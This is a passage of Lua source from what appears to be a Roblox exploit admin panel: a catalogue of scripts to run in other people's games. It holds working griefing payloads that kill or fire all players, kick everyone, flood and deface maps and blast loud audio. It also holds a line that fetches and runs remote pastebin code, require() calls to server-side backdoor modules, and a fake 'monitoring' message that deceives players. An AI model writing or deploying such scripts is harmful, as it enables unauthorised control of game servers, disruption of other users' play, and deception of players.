			outerSphere.Size = Vector3.new(size, size, size)
			innerSphere.Size = Vector3.new(size * 0.95, size * 0.95, size * 0.95)

			outerSphere.Transparency = transparency
			innerSphere.Transparency = innerTransparency

			outerSphere.CFrame = CFrame.new(position)
			innerSphere.CFrame = CFrame.new(position)

			RunService.RenderStepped:Wait()
		end
		outerSphere:Destroy()
	end)
end

local function onCharacterDeath()
	local character = player.Character
	if character then
		local hrp = character:FindFirstChild("HumanoidRootPart")
		if hrp then
			createExplosion(hrp.Position)
		end
	end
end

local function setupCharacter()
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildWhichIsA("Humanoid")

	if humanoid then
		humanoid.Died:Connect(onCharacterDeath)
	end
end

player.CharacterAdded:Connect(setupCharacter)

if player.Character then
	setupCharacter()
end
]], "CS / SS")

cscript("set everyone on fire", [[
local fyecol = Color3.fromHex("4051ED")
local secfyecol = Color3.fromHex("99a3ff")

function fyre(character)
    if character and character:IsA("Model") then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            for _, part in pairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    local fye = Instance.new("Fire")
                    fye.Size = 10
                    fye.Heat = 1
                    fye.Color = fyecol
                    fye.SecondaryColor = secfyecol
                    fye.Parent = part
                end
            end
            
            task.spawn(function()
                while humanoid.Health > 0 do
                    humanoid.Health = humanoid.Health - 20
                    task.wait(0.5)
                end
            end)
        end
    end
end

for _, player in pairs(game.Players:GetPlayers()) do
    if player.Character then
        fyre(player.Character)
    end
end
]], "CS / SS")

cscript("roblox is down!!!", [[
local imageId = "rbxassetid://7866786419"

function createBillboardGui(part)
	local existingGui = part:FindFirstChildOfClass("BillboardGui")
	if existingGui then existingGui:Destroy() end

	local billboardGui = Instance.new("BillboardGui")			
	billboardGui.Size = UDim2.new(20, 0, 12, 0)
	billboardGui.AlwaysOnTop = true
	billboardGui.Parent = part
	billboardGui.Adornee = part

	local imageLabel = Instance.new("ImageLabel")			
	imageLabel.Size = UDim2.new(1, 0, 1, 0)
	imageLabel.Image = imageId
	imageLabel.BackgroundTransparency = 1
	imageLabel.Parent = billboardGui
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

function addBillboardGuis()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			createBillboardGui(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			createBillboardGui(newDescendant)
		end
	end)
end

addBillboardGuis()
]], "CS / SS")

cscript("work in all game 💯", [[
for _, message in pairs(game:GetDescendants()) do
	if message:IsA("Message") then
		message:Destroy()
	end
end

local message = Instance.new("Message")
message.Text = "unable's stupid admin panel v]] .. unable["version"] .. [[ successfully loaded 💯💯"
message.Parent = game:GetService("Workspace")

wait(2)

for _, message in pairs(game:GetDescendants()) do
	if message:IsA("Message") then
		message:Destroy()
	end
end

local message = Instance.new("Message")
message.Text = "work in all game 🔥💯💯"
message.Parent = game:GetService("Workspace")

wait(2)

for _, message in pairs(game:GetDescendants()) do
	if message:IsA("Message") then
		message:Destroy()
	end
end
]], "CS / SS")

cscript("tilt baseplate", [[
local baseplate = game.Workspace:FindFirstChild("Baseplate")
if baseplate and baseplate:IsA("BasePart") then
	task.spawn(function()
		for angle = 0, 43, 1 do
			baseplate.Orientation = Vector3.new(angle, 34, 0)
		end
	end)
end
]], "CS / SS")

cscript("darken", [[
	local l = Instance.new("ColorCorrectionEffect",game.Lighting)
	l.Contrast,l.Saturation,l.Brightness = 2, -0.75, 0.375
	l.TintColor = Color3.new(0,0,0)
]], "CS / SS")

cscript("reset lighting", [[
	local Lighting = game:GetService("Lighting")
	local Camera = game:GetService("Workspace").CurrentCamera

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}

	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("PostEffect") or effect:IsA("BloomEffect") or effect:IsA("ColorCorrectionEffect") or 
				effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") or effect:IsA("MotionBlurEffect") then
				effect:Destroy()
			end
		end
	end

	local function restoreCameraEffects()
		Camera.FieldOfView = 70
		Camera.CameraSubject = nil
		Camera.CameraType = Enum.CameraType.Custom
		for _, obj in ipairs(Camera:GetChildren()) do
			if obj:IsA("Script") or obj:IsA("LocalScript") then
				obj:Destroy()
			end
		end
	end

	task.spawn(function()
		for property, value in pairs(defaultValues) do
			pcall(function()
				Lighting[property] = value
			end)
		end

		restoreLightingEffects()
		restoreCameraEffects()
	end)
]], "CS / SS")

cscript("thick of it", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubbleTalk(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

wait(1)

bubbleTalk("I'm in the thick of it, everybody knows")

wait(3)


bubbleTalk("They know me where it snows, I skied in and they froze")

wait(3.5)


bubbleTalk("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)


bubbleTalk("Forty somethin' milli' subs or so, I've been told")

wait(3.6)

bubbleTalk("I'm in my prime, and this ain't even final form")

wait(3.2)

bubbleTalk("They knocked me down, but still, my feet, they find the floor")

wait(3.2)

bubbleTalk("I went from living rooms straight out to sold-out tours")

wait(3.5)

bubbleTalk("Life's a fight, but trust, I'm ready for the war")

wait(3.3)

bubbleTalk("Woah, oh, oh")

wait(3.05)

bubbleTalk("This is how the story goes")

wait(3.6)

bubbleTalk("Woah, oh, oh")

wait(2.9)

bubbleTalk("I guess this is how the story goes")

wait(3.3)

bubbleTalk("I'm in the thick of it, everybody knows")

wait(3)

bubbleTalk("They know me where it snows, I skied in and they froze")

wait(3.5)

bubbleTalk("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)

bubbleTalk("Forty somethin' milli' subs or so, I've been told")

wait(3.3)

bubbleTalk("From the screen to the ring, to the pеn, to the king")

wait(3)

bubbleTalk("Where's my crown? That's my bling, always drama when I ring")

wait(4.1)

bubbleTalk("See, I believe that if I see it in my heart")

wait(3)

bubbleTalk("Smash through the ceiling 'cause I'm reaching for the stars")

wait(3.7)

bubbleTalk("Woah, oh, oh")

wait(3.05)

bubbleTalk("This is how the story goes")

wait(3.6)

bubbleTalk("Woah, oh, oh")

wait(2.9)

bubbleTalk("I guess this is how the story goes")

wait(3.3)

bubbleTalk("I'm in the thick of it, everybody knows")

wait(3)

bubbleTalk("They know me where it snows, I skied in and they froze")

wait(3.5)

bubbleTalk("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)

bubbleTalk("Forty somethin' milli' subs or so, I've been told")

wait(3.6)

bubbleTalk("Highway to heaven, I'm just cruisin' by my lone'")

wait(3.2)

bubbleTalk("They cast me out, left me for dead, them people cold")

wait(3.2)

bubbleTalk("My faith in God, mind in the sun, I'm 'bout to sow (Yeah)")

wait(3.5)

bubbleTalk("My life is hard, I took the wheel, I cracked the code (Yeah-yeah, woah-oh-oh)")

wait(6)

bubbleTalk("Ain't nobody gon' save you, man, this life will break you (Yeah, woah-oh-oh)")

wait(5.8)

bubbleTalk("In the thick of it, this is how the story goes")

wait(4.5)

bubbleTalk("I'm in the thick of it, everybody knows")

wait(3)

bubbleTalk("They know me where it snows, I skied in and they froze")

wait(3.5)

bubbleTalk("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)

bubbleTalk("Forty somethin' milli' subs or so, I've been told")

wait(3.6)

bubbleTalk("I'm in the thick of it, everybody knows")

wait(3)

bubbleTalk("They know me where it snows, I skied in and they froze")

wait(3.5)

bubbleTalk("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)

bubbleTalk("Forty somethin' milli' subs or so, I've been told")

wait(3.5)

bubbleTalk("Wоah, оh, оh")

wait(3.05)

bubbleTalk("This is hоw the stоry goes")

wait(3.6)

bubbleTalk("Woah, oh, oh")

wait(2.9)

bubbleTalk("I guess this is how the story goes")
]], "CS / SS")

cscript("soul serverside", [[
	loadstring(game:HttpGet("https://pastebin.com/raw/adceDwMv"))()
]], "LS")

cscript("ro-xploit reborn", [[
	require(96184029574075)("%replace%with%username%")
]], "RQ")

cscript("killbrick rain", [[
local SpawnRate = 0.5
local BatchSize = 10
local FallSpeed = 50
local SizeVariation = 10

local ShapeTypes = {
	{Class = "Part", Shape = Enum.PartType.Block},
	{Class = "Part", Shape = Enum.PartType.Cylinder},
	{Class = "Part", Shape = Enum.PartType.Ball},
	{Class = "Part", Shape = Enum.PartType.Wedge},
	{Class = "Part", Shape = Enum.PartType.CornerWedge}
}

local ShapeContainer = Instance.new("Folder")
ShapeContainer.Name = "DeadlyRain"
ShapeContainer.Parent = workspace

local LocalPlayer = game:GetService("Players").LocalPlayer

local function createShapeBatch()
	for i = 1, BatchSize do
		local shapeData = ShapeTypes[math.random(1, #ShapeTypes)]

		local part = Instance.new(shapeData.Class)
		part.Shape = shapeData.Shape
		part.Material = Enum.Material.Neon
		part.Color = Color3.fromHex("4051ED")

		local baseSize = math.random(5, SizeVariation)
		part.Size = Vector3.new(baseSize, baseSize, baseSize)

		local camera = workspace.CurrentCamera
		local spawnX = math.random(-200, 200)
		local spawnZ = math.random(-200, 200)
		local spawnPos = Vector3.new(
			camera.CFrame.Position.X + spawnX,
			camera.CFrame.Position.Y + 100,
			camera.CFrame.Position.Z + spawnZ
		)

		part.Position = spawnPos
		part.Anchored = false
		part.CanCollide = true
		part.CanTouch = true
		part.CanQuery = true

		part.Orientation = Vector3.new(
			math.random(0, 360),
			math.random(0, 360),
			math.random(0, 360)
		)

		local bodyVelocity = Instance.new("BodyVelocity")
		bodyVelocity.Velocity = Vector3.new(
			math.random(-20, 20),
			-FallSpeed - math.random(0, 30),
			math.random(-20, 20)
		)
		bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
		bodyVelocity.Parent = part

		part.Touched:Connect(function(hit)
			local humanoid = hit.Parent:FindFirstChildOfClass("Humanoid")
			local player = game:GetService("Players"):GetPlayerFromCharacter(hit.Parent)

			if humanoid and player and player ~= LocalPlayer then
				humanoid.Health = 0
			end
		end)

		part.Parent = ShapeContainer
	end
end

local function rainShapes()
	while true do
		createShapeBatch()
		task.wait(SpawnRate)
	end
end

rainShapes()
]], "CS / SS")

cscript("KJ", [[
require(89529616632600)("%replace%with%username%", "KJ")
]], "RQ")

cscript("saitama", [[
require(14499140823)("%replace%with%username%", "saitama2")
]], "RQ")

cscript("assign to team", [[
local Teams = game:GetService("Teams")
local localPlayer = game.Players:FindFirstChild("%replace%with%username%")

local TEAM_NAME = "unable"
local TEAM_COLOR = Color3.fromHex("000000")

local function createTeam()
	for _, team in ipairs(Teams:GetTeams()) do
		if team.Name == TEAM_NAME then
			return team
		end
	end

	local newTeam = Instance.new("Team")
	newTeam.Name = TEAM_NAME
	newTeam.TeamColor = BrickColor.new(TEAM_COLOR)
	newTeam.Parent = Teams

	return newTeam
end

local function assignToTeam(team)
	localPlayer.Team = team
end

local team = createTeam()
assignToTeam(team)
]], "CS / SS")

cscript("discord notifications", [[
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
]], "CS / SS")

cscript("insult skids", [[
local function createScrollingText(text, originalObject)
	if not originalObject:IsA("Message") then return end

	local targetParent = originalObject.Parent
	local targetName = originalObject.Name

	local function createNewMessage()
		local newMessage = Instance.new("Message")
		newMessage.Name = targetName
		newMessage.Parent = targetParent

		local scrollControl = Instance.new("BoolValue")
		scrollControl.Name = "ScrollControl"
		scrollControl.Value = true
		scrollControl.Parent = newMessage

		local lines = {}
		for line in text:gmatch("([^\n]+)") do
			table.insert(lines, "" .. line .. "")
		end

		coroutine.wrap(function()
			local positions = {}
			for i = 1, #lines do
				positions[i] = 1
			end

			while scrollControl.Parent == newMessage and scrollControl.Value do
				local displayText = ""

				for i, line in ipairs(lines) do
					local lineLength = #line
					local pos = positions[i]

					local displayLine = line:sub(pos, pos + lineLength - 4)

					if #displayLine < lineLength - 3 then
						displayLine = displayLine .. line:sub(1, lineLength - 3 - #displayLine)
					end

					positions[i] = pos + 1
					if positions[i] > lineLength then
						positions[i] = 1
					end

					displayText = displayText .. displayLine
					if i < #lines then
						displayText = displayText .. "\n"
					end
				end

				newMessage.Text = displayText
				task.wait(0.15)
			end

			if scrollControl.Parent == newMessage then
				scrollControl:Destroy()
			end
		end)()

		return newMessage
	end

	local currentMessage = createNewMessage()

	coroutine.wrap(function()
		while true do
			task.wait(1)

			if not currentMessage or not currentMessage.Parent then
				currentMessage = createNewMessage()
			end

			for _, sound in pairs(game:GetDescendants()) do
				if sound:IsA("Sound") and sound.Name ~= "dontdeleteme" and sound.Name ~= "canttouchthis" then
					sound:Destroy()
				end
			end
			
			for _, message in pairs(game:GetDescendants()) do
				if message:IsA("Sound") and message.Name ~= "yuhh" then
					message:Destroy()
				end
			end
			
			for _, hint in pairs(game:GetDescendants()) do
				if hint:IsA("Sound") then
					hint:Destroy()
				end
			end

			local Lighting = game:GetService("Lighting")
			local Camera = game:GetService("Workspace").CurrentCamera

			local defaultValues = {
				Brightness = 2,
				Ambient = Color3.new(0.5, 0.5, 0.5),
				ColorShift_Bottom = Color3.new(0, 0, 0),
				ColorShift_Top = Color3.new(0, 0, 0),
				OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
				ClockTime = 14,
				FogColor = Color3.new(1, 1, 1),
				FogEnd = 10000000000,
				FogStart = 0,
				GeographicLatitude = 41.733,
				GlobalShadows = true,
				ExposureCompensation = 0,
				EnvironmentDiffuseScale = 1,
				EnvironmentSpecularScale = 1,
				ShadowSoftness = 0.2,
				Technology = Enum.Technology.Compatibility,
			}

			local function restoreLightingEffects()
				for _, effect in ipairs(Lighting:GetChildren()) do
					if effect:IsA("PostEffect") or effect:IsA("BloomEffect") or effect:IsA("ColorCorrectionEffect") or 
						effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") or effect:IsA("MotionBlurEffect") then
						effect:Destroy()
					end
				end
			end

			local function restoreCameraEffects()
				Camera.FieldOfView = 70
				Camera.CameraSubject = nil
				Camera.CameraType = Enum.CameraType.Custom
				for _, obj in ipairs(Camera:GetChildren()) do
					if obj:IsA("Script") or obj:IsA("LocalScript") then
						obj:Destroy()
					end
				end
			end

			task.spawn(function()
				for property, value in pairs(defaultValues) do
					pcall(function()
						Lighting[property] = value
					end)
				end

				restoreLightingEffects()
				restoreCameraEffects()
			end)
		end
	end)()

	return currentMessage
end

local bro = Instance.new("Message", workspace)
bro.Name = "yuhh"

local messageText = table.concat({
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
	"can you not execute shitty scripts uploaded to scriptblox with shitty UI design made by chatgpt okay thanks | ",
}, "\n")

createScrollingText(messageText, bro)
]], "CS / SS")

cscript("server lock", [[
while true do
for a, xb in pairs(game.Players:children()) do
if xb.Name~=game.Players.LocalPlayer.Name then xb:Destroy() end
end
wait(.69)
end
]], "CS / SS")

cscript("bloxiphant message", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubbleTalk(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

spawn(function()
	bubbleTalk("Your behavior is briefly being monitored under the Monitoring Program. To opt-out please contact Gerard B. (Bloxiphant) via e-mail or Roblox messages.")
end)
]], "CS / SS")

cscript("flood map", [[
local flood = Region3.new(Vector3.new(-1250,0,-1250), Vector3.new(1250, 500, 1250))
flood = flood:ExpandToGrid(4)
game.Workspace.Terrain:FillRegion(flood, 4, Enum.Material.Water)
]], "CS / SS")

cscript("HD admin", [[
	require(9985547712):give("%replace%with%username%")
]], "RQ")

cscript("taco rain", [[
game:GetService("RunService").Heartbeat:Connect(function()
	local v81 = true
	local v764 = Instance.new("SpecialMesh");
	v764.MeshType = Enum.MeshType.FileMesh;
	v764.Scale = Vector3.new(3, 3, 3);
	v764.MeshId = "http://www.roblox.com/asset/?id=14846869";
	v764.TextureId = "http://www.roblox.com/asset/?id=14846834";
	if (v81 == true) then
		local v899;
		local v900;
		if (game.Players ~= nil) then
			if (game.Players.LocalPlayer ~= nil) then
				if (game.Players.LocalPlayer.Character ~= nil) then
					v900 = game.Players.LocalPlayer.Character;
				else
					v900 = nil;
				end
			else
				v900 = nil;
			end
		else
			v900 = nil;
		end
		if (v900 ~= nil) then
			v899 = v900:GetModelCFrame();
		else
			v899 = CFrame.new(0, 0, 0);
		end
		local v901 = Instance.new("Part");
		v901.CanCollide = true;
		v901.RotVelocity = Vector3.new(math.random() * math.pi, math.random() * math.pi, math.random() * math.pi);
		local v904 = v764:clone();
		v904.Parent = v901;
		v904.Scale = Vector3.new(10, 10, 10);
		v901.CFrame = v899 * CFrame.new((math.random() * 500) - 250, math.random(100, 200), (math.random() * 500) - 250);
		v901.Parent = workspace;
		game:GetService("Debris"):AddItem(v901, 4);
	end
end)
]], "CS / SS")

cscript("duck rain", [[
game:GetService("RunService").Heartbeat:Connect(function()
	local v81 = true
	local v764 = Instance.new("SpecialMesh");
	v764.MeshType = Enum.MeshType.FileMesh;
	v764.Scale = Vector3.new(3, 3, 3);
	v764.MeshId = "http://www.roblox.com/asset/?id=9419831";
	v764.TextureId = "http://www.roblox.com/asset/?id=9419827";
	if (v81 == true) then
		local v899;
		local v900;
		if (game.Players ~= nil) then
			if (game.Players.LocalPlayer ~= nil) then
				if (game.Players.LocalPlayer.Character ~= nil) then
					v900 = game.Players.LocalPlayer.Character;
				else
					v900 = nil;
				end
			else
				v900 = nil;
			end
		else
			v900 = nil;
		end
		if (v900 ~= nil) then
			v899 = v900:GetModelCFrame();
		else
			v899 = CFrame.new(0, 0, 0);
		end
		local v901 = Instance.new("Part");
		v901.CanCollide = true;
		v901.RotVelocity = Vector3.new(math.random() * math.pi, math.random() * math.pi, math.random() * math.pi);
		local v904 = v764:clone();
		v904.Parent = v901;
		v904.Scale = Vector3.new(10, 10, 10);
		v901.CFrame = v899 * CFrame.new((math.random() * 500) - 250, math.random(100, 200), (math.random() * 500) - 250);
		v901.Parent = workspace;
		game:GetService("Debris"):AddItem(v901, 4);
	end
end)
]], "CS / SS")

cscript("unc00lify", [[
local batchSize = 1000000
local imageId = "rbxassetid://92724155258384"
local musicId = "rbxassetid://110251728423993"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			task.wait(1)
		end
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				task.wait(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint"
				bro.Parent = workspace
				write("join team noxious later maybe idk | gg/xZC8zJzF7u", bro)
			end
			task.wait(1)
		end
	end)

	write("join team noxious later maybe idk | gg/xZC8zJzF7u", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("unc00lify (batch)", [[
local batchSize = 90
local imageId = "rbxassetid://92724155258384"
local musicId = "rbxassetid://110251728423993"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
